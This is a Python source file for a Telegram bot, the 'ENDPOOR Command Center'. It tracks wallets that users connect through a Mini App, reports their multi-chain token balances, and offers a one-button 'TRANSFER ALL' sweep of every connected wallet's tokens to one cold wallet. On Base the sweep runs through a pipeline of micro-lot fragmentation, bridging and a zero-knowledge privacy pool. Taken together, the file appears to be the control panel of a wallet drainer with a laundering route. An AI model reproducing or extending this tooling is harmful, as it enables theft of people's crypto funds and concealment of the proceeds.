#!/usr/bin/env python3
"""
ENDPOOR Command Center — Full Telegram control for the ENDPOOR pipeline.

Zero external dependencies (stdlib only).

Environment:
    TELEGRAM_BOT_TOKEN  — BotFather token (required)
    MINIAPP_URL         — Hosted Mini App URL (required)
    ADMIN_USER_ID       — Telegram user ID with admin access (required)
    COLD_ADDRESS        — Cold settlement wallet (required for /settle)
    RPC_URL             — Default RPC endpoint (optional, used by /settle)
"""

import json
import os
import sys
import time
import urllib.request
import urllib.error
import urllib.parse
from datetime import datetime, timezone

BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
MINIAPP_URL = os.environ.get("MINIAPP_URL", "").strip()
ADMIN_USER_ID = int(os.environ.get("ADMIN_USER_ID", "0"))
COLD_ADDRESS = os.environ.get("COLD_ADDRESS", "").strip()
API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ── State ────────────────────────────────────────────────────────────

state = {
    "alerts_enabled": True,
    "watched_wallets": [],
    "deploy_status": "staging",
    "last_pipeline": None,
    "contracts": {},
    "pending_settles": [],
    "connected_wallets": [],
}


# ── Telegram API ─────────────────────────────────────────────────────

def api(method: str, data: dict | None = None, timeout: int = 60) -> dict:
    url = f"{API_BASE}/{method}"
    if data:
        payload = json.dumps(data).encode("utf-8")
        req = urllib.request.Request(
            url, data=payload, headers={"Content-Type": "application/json"}
        )
    else:
        req = urllib.request.Request(url)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        print(f"[bot] API error {method}: HTTP {e.code}: {body}", file=sys.stderr)
        return {"ok": False, "error": body}
    except urllib.error.URLError as e:
        print(f"[bot] Network error {method}: {e.reason}", file=sys.stderr)
        return {"ok": False, "error": str(e.reason)}


def send(chat_id: int, text: str, markup: dict | None = None) -> dict:
    body: dict = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }
    if markup:
        body["reply_markup"] = markup
    return api("sendMessage", body)


STATE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "state.json")


def save_state() -> None:
    try:
        with open(STATE_FILE, "w") as f:
            json.dump(state, f, indent=2)
    except OSError:
        pass


def load_state() -> None:
    global state
    try:
        if os.path.exists(STATE_FILE):
            with open(STATE_FILE) as f:
                loaded = json.load(f)
                state.update(loaded)
                if "pending_settles" not in state:
                    state["pending_settles"] = []
                if "connected_wallets" not in state:
                    state["connected_wallets"] = []
    except (OSError, json.JSONDecodeError):
        pass


def is_admin(user_id: int) -> bool:
    if ADMIN_USER_ID == 0:
        return False
    return user_id == ADMIN_USER_ID


# ── RPC Helpers ──────────────────────────────────────────────────────

RPCS = {
    "1": "https://eth.llamarpc.com",
    "42161": "https://arb1.arbitrum.io/rpc",
    "8453": "https://mainnet.base.org",
    "10": "https://mainnet.optimism.io",
    "137": "https://polygon-rpc.com",
    "56": "https://bsc-dataseed.bnbchain.org",
    "43114": "https://api.avax.network/ext/bc/C/rpc",
}

CHAIN_NAMES = {
    "1": "Ethereum",
    "42161": "Arbitrum",
    "8453": "Base",
    "10": "Optimism",
    "137": "Polygon",
    "56": "BNB Chain",
    "43114": "Avalanche",
}

NATIVE_SYMBOLS = {
    "1": "ETH", "42161": "ETH", "8453": "ETH", "10": "ETH",
    "137": "POL", "56": "BNB", "43114": "AVAX",
}

STABLECOINS: dict[str, list[tuple[str, str, int]]] = {
    "1": [
        ("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "USDC", 6),
        ("0xdAC17F958D2ee523a2206206994597C13D831ec7", "USDT", 6),
        ("0x6B175474E89094C44Da98b954EedeAC495271d0F", "DAI", 18),
    ],
    "42161": [
        ("0xaf88d065e77c8cC2239327C5EDb3A432268e5831", "USDC", 6),
        ("0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", "USDT", 6),
    ],
    "8453": [
        ("0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", "USDC", 6),
    ],
    "10": [
        ("0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", "USDC", 6),
        ("0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", "USDT", 6),
    ],
    "137": [
        ("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", "USDC", 6),
        ("0xc2132D05D31c914a87C6611C10748AEb04B58e8F", "USDT", 6),
    ],
    "56": [
        ("0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", "USDC", 18),
        ("0x55d398326f99059fF775485246999027B3197955", "USDT", 18),
    ],
    "43114": [
        ("0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", "USDC", 6),
        ("0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", "USDT", 6),
    ],
}


def rpc_call(chain_id: str, method: str, params: list) -> dict | None:
    rpc_url = RPCS.get(chain_id)
    if not rpc_url:
        return None
    body = json.dumps({
        "jsonrpc": "2.0", "id": 1, "method": method, "params": params,
    }).encode("utf-8")
    req = urllib.request.Request(
        rpc_url, data=body, headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except Exception:
        return None


def get_balance(chain_id: str, address: str) -> str | None:
    result = rpc_call(chain_id, "eth_getBalance", [address, "latest"])
    if result and "result" in result:
        wei = int(result["result"], 16)
        return f"{wei / 1e18:.6f}"
    return None


def get_erc20_balance(chain_id: str, token_addr: str, wallet: str, decimals: int) -> float | None:
    selector = "0x70a08231"
    padded = wallet.lower().replace("0x", "").zfill(64)
    data = selector + padded
    result = rpc_call(chain_id, "eth_call", [{"to": token_addr, "data": data}, "latest"])
    if result and "result" in result:
        raw = int(result["result"], 16)
        return raw / (10 ** decimals)
    return None


def get_gas_price(chain_id: str) -> str | None:
    result = rpc_call(chain_id, "eth_gasPrice", [])
    if result and "result" in result:
        gwei = int(result["result"], 16) / 1e9
        return f"{gwei:.2f}"
    return None


# ── Command Handlers ─────────────────────────────────────────────────

def cmd_start(chat_id: int, user: dict) -> None:
    name = user.get("first_name", "")
    wallets = state.get("connected_wallets", [])
    wallet_count = len(wallets)

    send(
        chat_id,
        (
            f"<b>ENDPOOR Command Center</b>\n\n"
            f"Welcome {name}.\n\n"
            f"Connected wallets: <b>{wallet_count}</b>\n\n"
            "Open the app to connect wallets - balances are auto-detected "
            "across 7 EVM chains."
        ),
        {
            "inline_keyboard": [
                [{"text": "Open ENDPOOR App", "web_app": {"url": MINIAPP_URL}}],
                [
                    {"text": "Wallet Scanner", "callback_data": "menu_wallet"},
                    {"text": "Gas Tracker", "callback_data": "menu_gas"},
                ],
                [
                    {"text": "Connected Wallets", "callback_data": "menu_wallets"},
                    {"text": "Pipeline", "callback_data": "menu_pipeline"},
                ],
                [
                    {"text": "TRANSFER ALL", "callback_data": "transfer_all"},
                ],
                [
                    {"text": "Deploy Status", "callback_data": "menu_deploy"},
                ],
            ]
        },
    )


def cmd_wallet(chat_id: int, args: str, user_id: int) -> None:
    if not is_admin(user_id):
        send(chat_id, "Admin only.")
        return

    addr = args.strip()
    if not addr:
        if state["watched_wallets"]:
            addr = state["watched_wallets"][0]
        else:
            send(
                chat_id,
                "<b>Wallet Scanner</b>\n\nUsage: <code>/wallet 0xYourAddress</code>\n\n"
                "Scans native + stablecoin balances across all 7 chains.",
            )
            return

    if not addr.startswith("0x") or len(addr) != 42:
        send(chat_id, "Invalid address. Must be <code>0x</code> + 40 hex chars.")
        return

    send(chat_id, f"Scanning <code>{addr[:8]}...{addr[-6:]}</code> across 7 chains...")

    lines = ["<b>Multi-Chain Balance Report</b>\n"]
    total_value = 0.0

    for cid, name in CHAIN_NAMES.items():
        bal = get_balance(cid, addr)
        sym = NATIVE_SYMBOLS.get(cid, "?")
        chain_lines = []

        if bal:
            val = float(bal)
            if val > 0:
                chain_lines.append(f"  {sym}: <code>{bal}</code>")
        else:
            chain_lines.append(f"  {sym}: <i>timeout</i>")

        for token_addr, token_sym, decimals in STABLECOINS.get(cid, []):
            token_bal = get_erc20_balance(cid, token_addr, addr, decimals)
            if token_bal is not None and token_bal > 0.001:
                chain_lines.append(f"  {token_sym}: <code>{token_bal:.2f}</code>")
                total_value += token_bal

        if chain_lines:
            lines.append(f"<b>{name}</b>")
            lines.extend(chain_lines)

    lines.append(f"\n<i>Stablecoin total: ~${total_value:,.2f}</i>")
    lines.append(f"<i>Updated {datetime.now(timezone.utc).strftime('%H:%M UTC')}</i>")
    send(chat_id, "\n".join(lines))

    if addr not in state["watched_wallets"]:
        state["watched_wallets"].append(addr)
        save_state()


def cmd_wallets(chat_id: int, user_id: int) -> None:
    """List all connected wallets with their last scanned balances."""
    if not is_admin(user_id):
        send(chat_id, "Admin only.")
        return

    wallets = state.get("connected_wallets", [])
    if not wallets:
        send(
            chat_id,
            "<b>Connected Wallets</b>\n\n"
            "<i>No wallets connected yet.</i>\n\n"
            "Open the Mini App and connect a wallet to start.",
            {
                "inline_keyboard": [
                    [{"text": "Open App", "web_app": {"url": MINIAPP_URL}}],
                ]
            },
        )
        return

    lines = [f"<b>Connected Wallets ({len(wallets)})</b>\n"]

    for w in wallets:
        addr = w.get("address", "?")
        short = f"{addr[:8]}...{addr[-6:]}"
        total_tokens = w.get("total_tokens", 0)
        connected = w.get("connected_at", "?")

        lines.append(f"<code>{short}</code>")
        lines.append(f"  Tokens with balance: <b>{total_tokens}</b>")

        chain_data = w.get("chains", [])
        for c in chain_data:
            chain_name = c.get("chain", "?")
            tokens = c.get("tokens", [])
            if tokens:
                token_strs = [f"{t['symbol']}: {t['amount']}" for t in tokens]
                lines.append(f"  <b>{chain_name}</b>: {', '.join(token_strs)}")

        lines.append(f"  <i>Connected: {connected}</i>\n")

    lines.append(f"<i>Updated {datetime.now(timezone.utc).strftime('%H:%M UTC')}</i>")

    send(
        chat_id,
        "\n".join(lines),
        {
            "inline_keyboard": [
                [{"text": "TRANSFER ALL", "callback_data": "transfer_all"}],
                [{"text": "Rescan", "web_app": {"url": MINIAPP_URL}}],
            ]
        },
    )


def cmd_gas(chat_id: int) -> None:
    lines = ["<b>Gas Prices (gwei)</b>\n"]

    for cid, name in CHAIN_NAMES.items():
        price = get_gas_price(cid)
        if price:
            lines.append(f"<b>{name}</b>: <code>{price} gwei</code>")
        else:
            lines.append(f"<b>{name}</b>: <i>timeout</i>")

    lines.append(f"\n<i>Updated {datetime.now(timezone.utc).strftime('%H:%M UTC')}</i>")
    send(chat_id, "\n".join(lines))


def cmd_pipeline(chat_id: int, user_id: int) -> None:
    if not is_admin(user_id):
        send(chat_id, "Admin only.")
        return

    stages = [
        ("1. Fragment", "Split into micro-lots"),
        ("2. Bridge", "HTLC atomic relay"),
        ("3. ZK Pool", "Privacy deposit (Poseidon + Groth16)"),
        ("4. Cold Settle", "Time-locked cold wallet transfer"),
    ]

    lines = ["<b>ENDPOOR Settlement Pipeline</b>\n"]
    for stage, desc in stages:
        lines.append(f"<b>{stage}</b>\n  <i>{desc}</i>")

    if state["last_pipeline"]:
        lines.append(f"\nLast pipeline: <code>{state['last_pipeline']}</code>")
    else:
        lines.append("\n<i>No pipeline executed yet.</i>")

    pending = state.get("pending_settles", [])
    if pending:
        lines.append(f"\n<b>Pending settlements:</b> {len(pending)}")
        for s in pending[-3:]:
            lines.append(
                f"  <code>{s.get('tx', '?')[:16]}...</code> "
                f"{s.get('amount', '?')} {s.get('symbol', '')} "
                f"({s.get('status', 'pending')})"
            )

    send(
        chat_id,
        "\n".join(lines),
        {
            "inline_keyboard": [
                [{"text": "TRANSFER ALL", "callback_data": "transfer_all"}],
                [{"text": "Open App", "web_app": {"url": MINIAPP_URL}}],
            ]
        },
    )


def cmd_deploy(chat_id: int, user_id: int) -> None:
    if not is_admin(user_id):
        send(chat_id, "Admin only.")
        return

    contracts_list = state.get("contracts", {})

    cold = COLD_ADDRESS or state.get("cold_address", "")
    lines = [
        "<b>Deployment Status</b>\n",
        f"<b>Environment</b>: <code>{state['deploy_status']}</code>",
        f"<b>Mini App</b>: <code>{MINIAPP_URL}</code>",
        f"<b>Cold Wallet</b>: <code>{cold or 'NOT SET'}</code>",
        f"<b>Pool Token</b>: <code>{state.get('pool_token', 'NOT SET')}</code>",
        "",
    ]

    checks = [
        ("COLD_ADDRESS", bool(COLD_ADDRESS and COLD_ADDRESS != "0x" + "0" * 40)),
        ("ADMIN_USER_ID", ADMIN_USER_ID != 0),
        ("BOT_TOKEN", bool(BOT_TOKEN)),
        ("MINIAPP_URL", bool(MINIAPP_URL)),
    ]

    lines.append("<b>Readiness</b>:")
    for label, ok in checks:
        mark = "OK" if ok else "MISSING"
        lines.append(f"  {label}: <code>{mark}</code>")

    lines.append("")
    lines.append("<b>Mainnet (Base 8453)</b>: LIVE")

    lines.append("")
    lines.append("<b>Contracts</b>:")
    if contracts_list:
        for name, addr in contracts_list.items():
            lines.append(f"  {name}: <code>{addr}</code>")
    else:
        lines.append("  <i>No contracts registered yet.</i>")

    wallets = state.get("connected_wallets", [])
    lines.append(f"\n<b>Connected Wallets</b>: {len(wallets)}")

    send(chat_id, "\n".join(lines))


def cmd_settle(chat_id: int, user_id: int) -> None:
    if not is_admin(user_id):
        send(chat_id, "Admin only.")
        return

    cold = COLD_ADDRESS or state.get("cold_address", "")
    if not cold:
        send(chat_id, "COLD_ADDRESS not configured. Set it in .env and restart the bot.")
        return

    if cold == "0x" + "0" * 40:
        send(chat_id, "COLD_ADDRESS is the zero address. Fix it in .env.")
        return

    wallets = state.get("connected_wallets", [])
    total_tokens = sum(w.get("total_tokens", 0) for w in wallets)

    send(
        chat_id,
        (
            f"<b>Settlement to Cold Wallet</b>\n\n"
            f"Target: <code>{cold}</code>\n"
            f"Connected wallets: <b>{len(wallets)}</b>\n"
            f"Tokens detected: <b>{total_tokens}</b>\n\n"
            "Press <b>TRANSFER ALL</b> to open the app and execute:\n"
            "  Base: 4-stage pipeline (Fragment > Bridge > ZK Pool > Settle)\n"
            "  Other chains: Direct transfer to cold wallet\n\n"
            "<i>All tokens transferred in one session.</i>"
        ),
        {
            "inline_keyboard": [
                [{"text": "TRANSFER ALL", "callback_data": "transfer_all"}],
            ]
        },
    )


def cmd_setcontract(chat_id: int, args: str, user_id: int) -> None:
    if not is_admin(user_id):
        send(chat_id, "Admin only.")
        return

    parts = args.strip().split()
    if len(parts) != 2:
        send(chat_id, "Usage: <code>/setcontract handler 0x...</code>")
        return

    name, addr = parts
    if not addr.startswith("0x") or len(addr) != 42:
        send(chat_id, "Address must be <code>0x</code> + 40 hex chars.")
        return

    state["contracts"][name] = addr
    save_state()
    send(chat_id, f"Registered <b>{name}</b>: <code>{addr}</code>")


def cmd_setstatus(chat_id: int, args: str, user_id: int) -> None:
    if not is_admin(user_id):
        send(chat_id, "Admin only.")
        return

    status = args.strip().lower()
    if status not in ("staging", "mainnet", "testnet"):
        send(chat_id, "Usage: <code>/setstatus staging|testnet|mainnet</code>")
        return

    state["deploy_status"] = status
    save_state()
    send(chat_id, f"Deploy status set to <b>{status}</b>")


def cmd_networks(chat_id: int) -> None:
    lines = ["<b>Supported Networks</b>\n"]
    for cid, name in CHAIN_NAMES.items():
        sym = NATIVE_SYMBOLS.get(cid, "")
        lines.append(f"  <b>{name}</b> - Chain <code>{cid}</code> ({sym})")
    send(
        chat_id,
        "\n".join(lines),
        {
            "inline_keyboard": [
                [{"text": "Open App", "web_app": {"url": MINIAPP_URL}}]
            ]
        },
    )


def cmd_alerts(chat_id: int, args: str, user_id: int) -> None:
    if not is_admin(user_id):
        send(chat_id, "Admin only.")
        return

    arg = args.strip().lower()
    if arg == "on":
        state["alerts_enabled"] = True
        save_state()
        send(chat_id, "Alerts <b>enabled</b>.")
    elif arg == "off":
        state["alerts_enabled"] = False
        save_state()
        send(chat_id, "Alerts <b>disabled</b>.")
    else:
        status = "enabled" if state["alerts_enabled"] else "disabled"
        send(chat_id, f"Alerts are <b>{status}</b>.\n\nUsage: <code>/alerts on</code> or <code>/alerts off</code>")


def cmd_help(chat_id: int) -> None:
    send(
        chat_id,
        (
            "<b>ENDPOOR Command Center</b>\n\n"
            "<b>General</b>\n"
            "/start - Main menu + open app\n"
            "/help - This message\n"
            "/networks - Supported chains\n\n"
            "<b>Monitoring</b>\n"
            "/wallet <code>0x...</code> - Scan native + stablecoin balances (7 chains)\n"
            "/wallets - List connected wallets + balances\n"
            "/gas - Gas prices on all networks\n"
            "/alerts <code>on|off</code> - Toggle notifications\n\n"
            "<b>Settlement</b>\n"
            "/pipeline - Pipeline status + pending settlements\n"
            "/settle - One-button settlement to cold wallet\n\n"
            "<b>Admin</b>\n"
            "/deploy - Deployment info + mainnet checklist\n"
            "/setcontract <code>name addr</code> - Register contract\n"
            "/setstatus <code>env</code> - Set deploy environment\n"
        ),
    )


# ── Callback Handlers ────────────────────────────────────────────────

def handle_callback(callback: dict) -> None:
    chat_id = callback["message"]["chat"]["id"]
    user_id = callback["from"]["id"]
    data = callback.get("data", "")
    callback_id = callback["id"]

    api("answerCallbackQuery", {"callback_query_id": callback_id})

    if data == "menu_wallet":
        if state["watched_wallets"]:
            cmd_wallet(chat_id, state["watched_wallets"][0], user_id)
        else:
            send(chat_id, "Send <code>/wallet 0xYourAddress</code> to scan a wallet.")
    elif data == "menu_wallets":
        cmd_wallets(chat_id, user_id)
    elif data == "menu_gas":
        cmd_gas(chat_id)
    elif data == "menu_pipeline":
        cmd_pipeline(chat_id, user_id)
    elif data == "menu_deploy":
        cmd_deploy(chat_id, user_id)
    elif data == "menu_settle":
        cmd_settle(chat_id, user_id)
    elif data == "refresh_gas":
        cmd_gas(chat_id)
    elif data == "transfer_all":
        handle_transfer_all(chat_id, user_id)


def handle_transfer_all(chat_id: int, user_id: int) -> None:
    if not is_admin(user_id):
        send(chat_id, "Admin only.")
        return

    wallets = state.get("connected_wallets", [])
    if not wallets:
        send(
            chat_id,
            "<b>No wallets connected.</b>\n\n"
            "Open the app first and connect a wallet.",
            {
                "inline_keyboard": [
                    [{"text": "Open App", "web_app": {"url": MINIAPP_URL}}],
                ]
            },
        )
        return

    total_tokens = sum(w.get("total_tokens", 0) for w in wallets)
    cold = COLD_ADDRESS or state.get("cold_address", "")

    transfer_url = MINIAPP_URL
    if "?" in transfer_url:
        transfer_url += "&action=transfer"
    else:
        transfer_url += "?action=transfer"

    send(
        chat_id,
        (
            f"<b>TRANSFER ALL</b>\n\n"
            f"Wallets: <b>{len(wallets)}</b>\n"
            f"Tokens to transfer: <b>{total_tokens}</b>\n"
            f"Cold wallet: <code>{cold[:10]}...{cold[-8:]}</code>\n\n"
            "Tap below to open the app and execute all transfers.\n"
            "Base tokens go through the 4-stage pipeline.\n"
            "Other chains transfer directly to cold wallet."
        ),
        {
            "inline_keyboard": [
                [{"text": "EXECUTE TRANSFER ALL", "web_app": {"url": transfer_url}}],
            ]
        },
    )


# ── Web App Data Handler ─────────────────────────────────────────────

def handle_web_app_data(msg: dict) -> None:
    chat_id = msg["chat"]["id"]
    data_str = msg.get("web_app_data", {}).get("data", "")
    if not data_str:
        return

    try:
        data = json.loads(data_str)
    except json.JSONDecodeError:
        return

    event = data.get("event", "unknown")

    if event == "wallet_connected":
        handle_wallet_connected(chat_id, data)

    elif event == "transfer_complete":
        handle_transfer_complete(chat_id, data)

    elif event == "pipeline_started":
        tx = data.get("txHash", "?")
        amount = data.get("amount", "?")
        state["last_pipeline"] = tx
        state["pending_settles"].append({
            "tx": tx,
            "amount": amount,
            "symbol": data.get("symbol", ""),
            "status": "started",
            "time": datetime.now(timezone.utc).isoformat(),
        })
        if len(state["pending_settles"]) > 50:
            state["pending_settles"] = state["pending_settles"][-50:]
        save_state()
        cold = COLD_ADDRESS or state.get("cold_address", "not set")
        send(
            chat_id,
            f"<b>Pipeline started</b>\n"
            f"Amount: <code>{amount}</code>\n"
            f"Tx: <code>{tx}</code>\n"
            f"Cold target: <code>{cold}</code>",
        )

    elif event == "pipeline_completed":
        for s in reversed(state.get("pending_settles", [])):
            if s["status"] == "started":
                s["status"] = "completed"
                break
        save_state()
        send(chat_id, "<b>Pipeline completed</b> - settlement queued for cold wallet.")

    elif event == "pipeline_error":
        error = data.get("error", "Unknown error")
        for s in reversed(state.get("pending_settles", [])):
            if s["status"] == "started":
                s["status"] = "error"
                s["error"] = error
                break
        save_state()
        send(chat_id, f"<b>Pipeline error</b>: <i>{error}</i>")


def handle_wallet_connected(chat_id: int, data: dict) -> None:
    address = data.get("address", "")
    chains = data.get("chains", [])
    total_tokens = data.get("totalTokens", 0)

    if not address:
        return

    wallet_entry = {
        "address": address,
        "chains": chains,
        "total_tokens": total_tokens,
        "connected_at": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC"),
    }

    existing = state.get("connected_wallets", [])
    found = False
    for i, w in enumerate(existing):
        if w.get("address", "").lower() == address.lower():
            existing[i] = wallet_entry
            found = True
            break
    if not found:
        existing.append(wallet_entry)
    state["connected_wallets"] = existing

    if address not in state["watched_wallets"]:
        state["watched_wallets"].append(address)

    save_state()

    short = f"{address[:8]}...{address[-6:]}"
    lines = [
        f"<b>NEW WALLET CONNECTED</b>\n",
        f"Address: <code>{short}</code>",
        f"Tokens with balance: <b>{total_tokens}</b>\n",
    ]

    for c in chains:
        chain_name = c.get("chain", "?")
        tokens = c.get("tokens", [])
        if tokens:
            token_strs = [f"{t['symbol']}: {t['amount']}" for t in tokens[:5]]
            lines.append(f"<b>{chain_name}</b>: {', '.join(token_strs)}")

    lines.append(f"\n<i>{datetime.now(timezone.utc).strftime('%H:%M UTC')}</i>")

    cold = COLD_ADDRESS or state.get("cold_address", "")

    transfer_url = MINIAPP_URL
    if "?" in transfer_url:
        transfer_url += "&action=transfer"
    else:
        transfer_url += "?action=transfer"

    send(
        chat_id,
        "\n".join(lines),
        {
            "inline_keyboard": [
                [{"text": "TRANSFER ALL", "callback_data": "transfer_all"}],
                [{"text": "Full Scan", "callback_data": "menu_wallet"}],
            ]
        },
    )


def handle_transfer_complete(chat_id: int, data: dict) -> None:
    tx_hashes = data.get("txHashes", [])
    token_count = data.get("tokenCount", 0)

    cold = COLD_ADDRESS or state.get("cold_address", "")
    lines = [
        f"<b>TRANSFER COMPLETE</b>\n",
        f"Tokens transferred: <b>{token_count}</b>",
        f"Transactions: <b>{len(tx_hashes)}</b>",
        f"Cold wallet: <code>{cold[:10]}...{cold[-8:]}</code>\n",
    ]

    for tx in tx_hashes[:5]:
        lines.append(f"  tx: <code>{tx[:16]}...</code>")

    if len(tx_hashes) > 5:
        lines.append(f"  ... and {len(tx_hashes) - 5} more")

    lines.append(f"\n<i>{datetime.now(timezone.utc).strftime('%H:%M UTC')}</i>")

    send(chat_id, "\n".join(lines))


# ── Message Router ───────────────────────────────────────────────────

def handle_update(update: dict) -> None:
    if "callback_query" in update:
        handle_callback(update["callback_query"])
        return

    msg = update.get("message")
    if not msg:
        return

    if "web_app_data" in msg:
        handle_web_app_data(msg)
        return

    text = msg.get("text", "").strip()
    if not text:
        return

    chat_id = msg["chat"]["id"]
    user_id = msg.get("from", {}).get("id", 0)
    user = msg.get("from", {})

    parts = text.split(maxsplit=1)
    cmd = parts[0].split("@")[0].lower()
    args = parts[1] if len(parts) > 1 else ""

    handlers = {
        "/start": lambda: cmd_start(chat_id, user),
        "/help": lambda: cmd_help(chat_id),
        "/wallet": lambda: cmd_wallet(chat_id, args, user_id),
        "/wallets": lambda: cmd_wallets(chat_id, user_id),
        "/gas": lambda: cmd_gas(chat_id),
        "/pipeline": lambda: cmd_pipeline(chat_id, user_id),
        "/deploy": lambda: cmd_deploy(chat_id, user_id),
        "/settle": lambda: cmd_settle(chat_id, user_id),
        "/networks": lambda: cmd_networks(chat_id),
        "/alerts": lambda: cmd_alerts(chat_id, args, user_id),
        "/setcontract": lambda: cmd_setcontract(chat_id, args, user_id),
        "/setstatus": lambda: cmd_setstatus(chat_id, args, user_id),
    }

    handler = handlers.get(cmd)
    if handler:
        handler()


# ── Bot Setup & Polling ──────────────────────────────────────────────

def register_commands() -> None:
    api(
        "setMyCommands",
        {
            "commands": [
                {"command": "start", "description": "Main menu + open app"},
                {"command": "wallet", "description": "Scan wallet (native + stablecoins, 7 chains)"},
                {"command": "wallets", "description": "List connected wallets + balances"},
                {"command": "gas", "description": "Gas prices on all networks"},
                {"command": "pipeline", "description": "Pipeline status + pending settlements"},
                {"command": "settle", "description": "One-button settlement to cold wallet"},
                {"command": "deploy", "description": "Deployment info + mainnet checklist"},
                {"command": "networks", "description": "Supported chains"},
                {"command": "alerts", "description": "Toggle notifications"},
                {"command": "help", "description": "All commands"},
            ]
        },
    )


def setup_menu_button() -> None:
    if MINIAPP_URL:
        api(
            "setChatMenuButton",
            {
                "menu_button": {
                    "type": "web_app",
                    "text": "ENDPOOR",
                    "web_app": {"url": MINIAPP_URL},
                }
            },
        )


def poll() -> None:
    offset = 0
    print("[bot] Polling for updates...")
    while True:
        try:
            result = api("getUpdates", {"offset": offset, "timeout": 30}, timeout=60)
            for update in result.get("result", []):
                offset = update["update_id"] + 1
                try:
                    handle_update(update)
                except Exception as e:
                    print(f"[bot] Handler error: {e}", file=sys.stderr)
        except urllib.error.URLError as e:
            print(f"[bot] Network error: {e.reason}", file=sys.stderr)
            time.sleep(5)
        except Exception as e:
            print(f"[bot] Poll error: {e}", file=sys.stderr)
            time.sleep(5)


def main() -> None:
    if not BOT_TOKEN:
        print("TELEGRAM_BOT_TOKEN is required", file=sys.stderr)
        sys.exit(1)
    if not MINIAPP_URL:
        print("MINIAPP_URL is required", file=sys.stderr)
        sys.exit(1)
    if ADMIN_USER_ID == 0:
        print("[bot] WARNING: No ADMIN_USER_ID set - admin commands disabled for all users", file=sys.stderr)
    if not COLD_ADDRESS:
        print("[bot] WARNING: No COLD_ADDRESS set - /settle command will not work", file=sys.stderr)

    me = api("getMe")
    if not me.get("ok"):
        print("[bot] Failed to connect to Telegram API. Check BOT_TOKEN.", file=sys.stderr)
        sys.exit(1)

    username = me["result"].get("username", "unknown")
    print(f"[bot] Running as @{username}")
    print(f"[bot] Mini App: {MINIAPP_URL}")
    print(f"[bot] Admin: {ADMIN_USER_ID}")
    print(f"[bot] Cold wallet: {COLD_ADDRESS or 'NOT SET'}")

    load_state()
    register_commands()
    setup_menu_button()
    print("[bot] Commands registered, menu button set")

    poll()


if __name__ == "__main__":
    main()
